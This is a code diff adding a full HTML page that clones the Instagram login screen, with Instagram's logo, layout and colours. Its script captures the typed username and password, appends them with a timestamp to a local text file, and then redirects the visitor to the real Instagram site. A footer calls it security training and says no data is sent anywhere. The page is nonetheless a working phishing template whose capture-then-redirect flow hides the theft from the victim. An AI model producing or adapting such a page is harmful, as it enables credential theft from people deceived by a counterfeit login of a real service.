@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram - Log in</title>
+  <style>
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      background: white;
+      border: 1px solid #dbdbdb;
+      width: 350px;
+      padding: 40px 20px;
+      text-align: center;
+      border-radius: 3px;
+    }
+    .logo {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    button {
+      width: 95%;
+      padding: 8px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 10px 0;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
+  
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Phone number, username, or email" required />
+    <input type="password" id="password" placeholder="Password" required />
+    <button type="submit">Log in</button>
+  </form>
+  
+  <p style="color: #8e8e8e; font-size: 12px; margin-top: 20px;">
+    This page is created only for personal security training — no data is sent anywhere.
+  </p>
+</div>
+
+<script>
+// Variable to remember the file handle (so it doesn't ask again after first time)
+let fileHandle = null;
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  if (!username || !password) {
+    alert('Please fill in both fields');
+    return;
+  }
+
+  // Text that will be saved
+  const logEntry = 
+    `Time: ${new Date().toLocaleString('en-US')}\n` +
+    `Username / Email: ${username}\n` +
+    `Password: ${password}\n` +
+    `------------------------\n\n`;
+
+  try {
+    // If we haven't selected a file yet → ask user to choose or create a .txt file
+    if (!fileHandle) {
+      fileHandle = await window.showSaveFilePicker({
+        suggestedName: 'my-training-log.txt',
+        types: [{
+          description: 'Text Files',
+          accept: { 'text/plain': ['.txt'] },
+        }],
+      });
+    }
+
+    // Open file and append to the end
+    const writable = await fileHandle.createWritable({ keepExistingData: true });
+    await writable.seek((await fileHandle.getFile()).size); // go to end of file
+    await writable.write(logEntry);
+    await writable.close();
+
+    alert('Test credentials saved to file!\n\n(Now redirecting to real Instagram)');
+
+    // Redirect to the real Instagram website
+    window.location.href = 'https://www.instagram.com';
+  } catch (err) {
+    console.error('Error:', err);
+    alert('Error saving file:\n' + err.message + '\n\n(Your browser may not support this or permission was denied)');
+  }
+});
+</script>
+
+</body>
+</html>
